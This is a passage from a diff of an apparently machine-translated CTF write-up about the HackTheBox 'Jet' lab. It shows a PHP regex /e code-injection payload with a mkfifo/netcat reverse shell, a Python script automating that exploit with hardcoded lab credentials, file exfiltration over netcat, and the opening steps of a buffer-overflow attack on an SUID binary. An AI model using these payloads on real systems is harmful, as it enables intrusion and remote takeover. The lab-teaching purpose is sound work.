@@ -421,6 +421,232 @@ We change our id for a payload with mkfifo y nc to send a revshell and our data 
 ```console
 $ swearwords[/fuck/e]=system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.10+443+>/tmp/f')&to=test@test.com&subject=test&message=fuck&_wysihtml5_mode=1
 ```
+We send the data and receive a shell as `www-data` on the victim machine
+
+![jetadmin](24.png){: width="1200" height="800" }
+
+```console
+$ sudo netcat -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.37.10 
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ hostname -I  
+10.13.37.10
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
+```
+Although it is not necessary as an extra to automate gaining access we can create a script python that authenticates and sends the request with the `revshell`
+
+```console
+#!/usr/bin/python3
+import requests, sys
+from pwn import log
+
+if len(sys.argv) < 2:
+    log.failure(f"Uso: python3 {sys.argv[0]} <lhost> <lport>")
+    sys.exit(1)
+
+target = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin"
+session = requests.Session()
+
+auth = {"username": "admin", "password": "Hackthesystem200"}
+data = {"swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {sys.argv[1]} {sys.argv[2]} >/tmp/f')", "to": "test@test.com", "subject": "test", "message": "fuck", "_wysihtml5_mode": 1}  
+
+session.post(target + "/dologin.php", data=auth)
+session.post(target + "/email.php", data=data)
+```
+
+We run it passing our ip and port as argumentos and we get the shell
+
+```console
+python3 exploit.py 10.10.14.10 443
+```
+```console
+$ sudo netcat -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.37.10
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ hostname -I  
+10.13.37.10
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
+```
+Looking at the existing files in the current directory we see the flag, we read it
+
+```console
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ ls -l
+-rw-r--r--  1 root root        33 Dec 20  2017 a_flag_is_here.txt
+-rwxr-x---  1 root www-data   157 Jan  3  2018 auth.php
+-rwxr-x---  1 root www-data    39 Dec 20  2017 badwords.txt
+drwxr-x--- 32 root www-data  4096 Dec 20  2017 bower_components
+drwxr-x---  6 root www-data  4096 Oct  9  2017 build
+-rwxr-x---  1 root www-data    82 Dec 20  2017 conf.php
+-rwxr-x---  1 root www-data 44067 Dec 27  2017 dashboard.php
+-rwxr-x---  1 root www-data   600 Dec 20  2017 db.php
+drwxr-x---  5 root www-data  4096 Oct  9  2017 dist
+-rwxr-x---  1 root www-data   820 Dec 27  2017 dologin.php
+-rwxr-x---  1 root www-data  2881 Dec 27  2017 email.php
+-rwxr-x---  1 root www-data    43 Dec 20  2017 index.php
+drwxr-x---  2 root www-data  4096 Dec 20  2017 js
+-rwxr-x---  1 root www-data  3606 Dec 20  2017 login.php
+-rwxr-x---  1 root www-data    98 Dec 20  2017 logout.php
+drwxr-x--- 10 root www-data  4096 Dec 20  2017 plugins
+-rwxr-x---  1 root www-data    21 Nov 14  2017 stats.php
+drwxrwxrwx  2 root www-data  4096 Dec 20  2017 uploads
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ cat a_flag_is_here.txt  
+JET{p************d}
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
+```
+## Overflown
+Searching for files with privileges suid we found one out of the ordinary, leak
+
+```console
+www-data@jet:~$ find / -perm -4000 2>/dev/null  
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/lib/uncompress.so
+/home/leak
+/bin/umount
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/ntfs-3g
+/bin/ping6
+www-data@jet:~$
+```
+
+The file leak belongs to the user alex, it seems to be an execut able that gives us an address and asks us to exploit it, so it is probably a challenge
+
+```console
+www-data@jet:~$ ls -l /home/leak
+-rwsr-xr-x 1 alex alex 9112 Dec 12  2017  **/home/leak**
+
+www-data@jet:~$ /home/leak
+Oops, I'm leaking! 0x7ffe4e813060
+Pwn me ¯\_(ツ)_/¯
+```
+To exploit it we first need to analyze it locally, so we will download it, we can do it easily using netcat to send and receive it
+
+```console
+www-data@jet:~$ nc 10.10.14.10 4444 < /home/leak  
+www-data@jet:~$
+```
+```console
+$ nc -lvnp 4444 > leak
+Listening on 0.0.0.0 4444
+Connection received on 10.13.37.10
+```
+We can start by analyzing the binary with ida , we can see the functionmain
+
+![jetadmin](25.png){: width="1200" height="800" }
+
+It starts by defining a variable stringwith a 64byte buffer, then prints a message and the direcciónwhere it starts string, and receives the input withfgets
+
+```console
+int __fastcall main(int argc, const char **argv, const char **envp)  
+{
+  char string[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  _init(argc, argv, envp);
+  printf("Oops, I'm leaking! %p\n", string);
+  puts(aPwnMe);
+  printf("> ");
+  fgets(string, 512, stdin);
+  return 0;
+}
+```
+The function fgetsis vulnerable to Buffer Overflow also shows us the address of the input, and with checksecwe can see that the binary does not have protecciones
+
+```console
+checksec leak
+[*] '/home/kali/leak'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)  
+    RWX:      Has RWX segments
+```
+We start by creating a patron specially designed character set with gdb and running the program passing the pattern as input, the program gets corrupted
+
+```console
+$ gdb -q ./leak
+Reading symbols from leak...
+(No debugging symbols found in leak)
+pwndbg> cyclic 100
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+pwndbg> run
+Starting program: /home/kali/leak
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Oops, I'm leaking! 0x7fffffffe530
+Pwn me ¯\_(ツ)_/¯ 
+> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040088e in main ()
+pwndbg>
+```
+We can see the offset using pattern_offset gdb, just passing the value of the register RSP, we need 72bytes before overwriting the register RIP
+
+```console
+pwndbg> x/gx $rsp
+0x7fffffffe578: 0x616161616161616a
+pwndbg> cyclic -l 0x616161616161616a
+Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)  
+Found at offset 72
+pwndbg>
+```
+his time we create a chain of 72 A y 8 B to be able to debug the address
+
+```console
+python3 -q
+>>> "A" * 72 + "B" * 8
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'  
+>>>
+```
+Now we run the program passing our string as input, it gets corrupted
+
+```console
+gdb -q ./leak
+Reading symbols from leak...
+(No debugging symbols found in leak)
+pwndbg> run
+Starting program: /home/kali/leak
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Oops, I'm leaking! 0x7fffffffe530
+Pwn me ¯\_(ツ)_/¯ 
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040088e in main ()
+pwndbg>
+```
+If we look at the contents of the address leaked a when running the program we can verify that it is indeed the direccion start of our input
+
+```console
+pwndbg> x/10gx 0x7fffffffe530
+0x7fffffffe530: 0x4141414141414141  0x4141414141414141  
+0x7fffffffe540: 0x4141414141414141  0x4141414141414141  
+0x7fffffffe550: 0x4141414141414141  0x4141414141414141  
+0x7fffffffe560: 0x4141414141414141  0x4141414141414141  
+0x7fffffffe570: 0x4141414141414141  0x4242424242424242  
+pwndbg>
+```
+n order to run the exploit that we will do from our machine we will play with socat so that the program runs and we have access from the port 9999
 
 
 <html lang="en">
